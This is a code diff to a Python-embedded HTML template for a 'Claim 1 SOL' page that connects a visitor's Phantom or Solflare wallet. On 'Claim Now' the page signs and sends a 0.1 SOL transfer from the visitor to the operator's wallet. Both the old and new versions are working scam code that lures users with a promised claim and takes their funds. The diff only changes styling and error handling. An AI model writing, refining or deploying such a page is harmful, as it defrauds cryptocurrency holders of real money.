@@ -7,30 +7,29 @@ QR_CODE_URL = "https://raw.githubusercontent.com/markosgiassa1/coinupdater_bot/m
 
 HTML_TEMPLATE = """
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Claim 1 SOL</title>
-  <script src="https://unpkg.com/@solana/web3.js@1.76.0/lib/index.iife.min.js"></script>
+  <meta charset="UTF-8">
+  <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
   <style>
     body {
-      background-color: #000;
-      color: #fff;
-      font-family: Arial, sans-serif;
+      background-color: black;
+      color: white;
       text-align: center;
+      font-family: Arial, sans-serif;
       padding: 40px;
     }
     .button {
       background: linear-gradient(to right, #00ff90, #00d178);
       border: none;
-      color: #000;
+      color: black;
       font-weight: bold;
       padding: 14px 30px;
       font-size: 16px;
       border-radius: 30px;
       cursor: pointer;
-      margin: 20px;
+      margin: 10px;
     }
     .button:disabled {
       opacity: 0.5;
@@ -56,29 +55,27 @@ HTML_TEMPLATE = """
   <p>Send exactly <strong>0.1 SOL</strong> to:</p>
   <p><code>{{ wallet }}</code></p>
   <img id="qrCode" class="qr" src="{{ qr_url }}" alt="QR Code" />
-
+  
   <button class="button" id="connectBtn">🔗 Connect Wallet</button>
-  <button class="button" id="claimBtn" disabled>💸 Claim Now</button>
-
+  <button class="button" id="claimBtn" style="display: none;">💸 Claim Now</button>
   <div id="status">Click "Connect Wallet" to begin.</div>
 
   <script>
-    const walletAddress = "{{ wallet }}";
-    let provider = null;
-    let publicKey = null;
-
     const status = document.getElementById("status");
     const qr = document.getElementById("qrCode");
     const connectBtn = document.getElementById("connectBtn");
     const claimBtn = document.getElementById("claimBtn");
 
+    let provider = null;
+    let publicKey = null;
+
     connectBtn.addEventListener("click", async () => {
-      if (window?.phantom?.solana?.isPhantom) {
-        provider = window.phantom.solana;
-      } else if (window?.solflare?.isSolflare) {
+      if (window.solana?.isPhantom) {
+        provider = window.solana;
+      } else if (window.solflare?.isSolflare) {
         provider = window.solflare;
       } else {
-        status.innerText = "⚠️ No wallet detected (Phantom or Solflare). Try mobile wallet.";
+        status.innerText = "⚠️ No wallet found. Open this in Phantom or Solflare browser.";
         qr.style.display = "block";
         return;
       }
@@ -86,56 +83,45 @@ HTML_TEMPLATE = """
       try {
         status.innerText = "🔄 Connecting...";
         const resp = await provider.connect();
-        publicKey = resp?.publicKey?.toString() || provider.publicKey?.toString();
-
-        if (publicKey) {
-          status.innerText = "✅ Connected: " + publicKey;
-          connectBtn.innerText = "✅ Connected";
-          connectBtn.disabled = true;
-          claimBtn.disabled = false;
-        } else {
-          status.innerText = "❌ Connection failed.";
-        }
+        publicKey = resp?.publicKey || provider.publicKey;
+        status.innerText = "✅ Connected: " + publicKey.toString();
+        claimBtn.style.display = "inline-block";
       } catch (err) {
-        status.innerText = "❌ Connection rejected or failed.";
-        console.error(err);
+        status.innerText = "❌ Wallet connection failed: " + (err.message || err);
       }
     });
 
     claimBtn.addEventListener("click", async () => {
-      if (!provider || !publicKey) {
-        status.innerText = "❌ Connect wallet first.";
+      if (!publicKey) {
+        status.innerText = "⚠️ Connect wallet first.";
         return;
       }
 
       try {
         const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
-        const fromPubkey = new solanaWeb3.PublicKey(publicKey);
-        const toPubkey = new solanaWeb3.PublicKey(walletAddress);
-        const lamports = solanaWeb3.LAMPORTS_PER_SOL * 0.1;
+        const recipient = new solanaWeb3.PublicKey("{{ wallet }}");
 
         const transaction = new solanaWeb3.Transaction().add(
           solanaWeb3.SystemProgram.transfer({
-            fromPubkey,
-            toPubkey,
-            lamports
+            fromPubkey: publicKey,
+            toPubkey: recipient,
+            lamports: 0.1 * solanaWeb3.LAMPORTS_PER_SOL,
           })
         );
 
-        transaction.feePayer = fromPubkey;
-        const { blockhash } = await connection.getLatestBlockhash();
+        transaction.feePayer = publicKey;
+        let { blockhash } = await connection.getLatestBlockhash();
         transaction.recentBlockhash = blockhash;
 
-        const signed = await provider.signTransaction(transaction);
-        const signature = await connection.sendRawTransaction(signed.serialize());
-        await connection.confirmTransaction(signature);
+        let signed = await provider.signTransaction(transaction);
+        let txid = await connection.sendRawTransaction(signed.serialize());
+        status.innerText = "📤 Transaction sent! Waiting for confirmation...\\nTx ID: " + txid;
 
-        status.innerText = "✅ 0.1 SOL sent! Tx: https://solscan.io/tx/" + signature;
-        claimBtn.innerText = "✅ Claimed";
-        claimBtn.disabled = true;
+        await connection.confirmTransaction(txid);
+        status.innerText = "✅ Success! Transaction confirmed.\\nTx ID: " + txid;
       } catch (err) {
-        console.error(err);
-        status.innerText = "❌ Transaction failed or canceled.";
+        console.error("Transaction Error:", err);
+        status.innerText = "❌ Failed: " + (err?.message || "Unknown error");
       }
     });
   </script>
